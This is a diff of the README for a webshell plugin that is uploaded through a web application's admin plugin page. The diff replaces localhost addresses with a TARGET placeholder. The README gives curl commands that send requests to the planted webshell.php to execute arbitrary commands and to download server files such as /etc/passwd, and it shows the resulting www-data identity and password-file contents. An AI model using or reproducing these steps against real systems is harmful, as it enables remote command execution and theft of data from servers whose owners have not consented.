@@ -8,16 +8,16 @@
 
 ### Step 1: Upload the webshell plugin
 
-Go to "Configuration --> plugins" page, at http://localhost:10080/index.php/admin/pluginmanager/sa/index, and click on "Upload & install":
+Go to "Configuration --> plugins" page, at http://TARGET:10080/index.php/admin/pluginmanager/sa/index, and click on "Upload & install":
 
 ![](./imgs/upload_and_install.png)
 
 ### Step 2.1: Executing commands
 
-You can now execute commands by sending a GET or POST request to http://127.0.01/upload/plugins/WebShell/webshell.php with `action=exec&cmd=id`:
+You can now execute commands by sending a GET or POST request to http://TARGET/upload/plugins/WebShell/webshell.php with `action=exec&cmd=id`:
 
 ```sh
-$ curl -X POST 'http://localhost:10080/upload/plugins/WebShell/webshell.php' --data "action=exec&cmd=id"
+$ curl -X POST 'http://TARGET:10080/upload/plugins/WebShell/webshell.php' --data "action=exec&cmd=id"
 {"stdout":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","exec":"id"}
 ```
 
@@ -27,10 +27,10 @@ You can also access it by a GET request from a browser:
 
 ### Step 2.2: Downloading files
 
-You can also download remote files by sending a GET or POST request to http://localhost:10080/upload/plugins/WebShell/webshell.php with `action=download&cmd=/etc/passwd`:
+You can also download remote files by sending a GET or POST request to http://TARGET:10080/upload/plugins/WebShell/webshell.php with `action=download&cmd=/etc/passwd`:
 
 ```sh
-$ curl -X POST 'http://127.0.0.1/upload/plugins/WebShell/webshell.php' --data "action=download&path=/etc/passwd" -o-
+$ curl -X POST 'http://TARGET:10080/upload/plugins/WebShell/webshell.php' --data "action=download&path=/etc/passwd" -o-
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
